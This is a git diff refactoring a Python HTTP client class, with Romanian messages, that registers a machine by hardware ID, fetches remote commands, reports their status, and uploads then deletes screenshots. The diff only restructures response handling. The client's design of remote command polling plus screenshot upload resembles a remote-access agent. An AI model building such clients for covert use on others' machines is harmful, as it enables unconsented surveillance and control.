@@ -13,30 +13,26 @@ class Requests:
     }
 
     def __init__(self, hwid, host_data):
-        ip_address = host_data['DOMAIN']
-        port = host_data['PORT']
-        self.url = ip_address + ":" + port + "/api"
+        self.url = host_data['DOMAIN'] + ":" + host_data['PORT'] + "/api"
         response = requests.get(self.url + "/get-setup/" + str(hwid))  # pylint: disable=W3101
-        if response.status_code == 200:
-            print("Setup connectat cu success")
+        return self.return_response(response, False)
 
     def get_command(self, cmd_id):
         '''Method used to do get command as json format'''
         response = requests.get(self.url + "/get-commands/" + str(cmd_id))  # pylint: disable=W3101
-        return response.json()
+        return self.return_response(response, True)
 
     def post_new_setup(self, payload):
         '''Method used to do create new setups'''
         path = str(self.url) + "/post-setup"
         response = requests.post(path, data=payload, headers=self.header)  # pylint: disable=W3101
-        self.setup_data = response.json()
+        self.setup_data = self.return_response(response, True)
 
     def update_cmd_status(self, cmd_id):
         '''Method used to update status on specific command used'''
         path = str(self.url) + "/update-cmd-status/" + str(cmd_id)
         response = requests.get(path)  # pylint: disable=W3101
-        if response.status_code == 200:
-            print("Aplicatie deschisa cu success")
+        return self.return_response(response, False)
             
     def upload_file(self):
         '''Method used to upload screenshots'''
@@ -45,10 +41,14 @@ class Requests:
             data = open('tmp/ss.jpg', 'rb')
             path = str(self.url) + "/upload-ss"
             response = requests.post(path,files={"img": data})
-            if response.status_code == 200:
-                print("SS Uploaded!")
             data.close()
             os.remove("tmp/ss.jpg")
-            return True
+            return self.return_response(response, False)
+
+    def return_response(self, req_response, json):
+        if req_response.status_code == 200:
+            print("A successful request has been made.")
         else:
-            return False 
+            print(req_response.json())
+        if json == True:
+            return req_response.json()
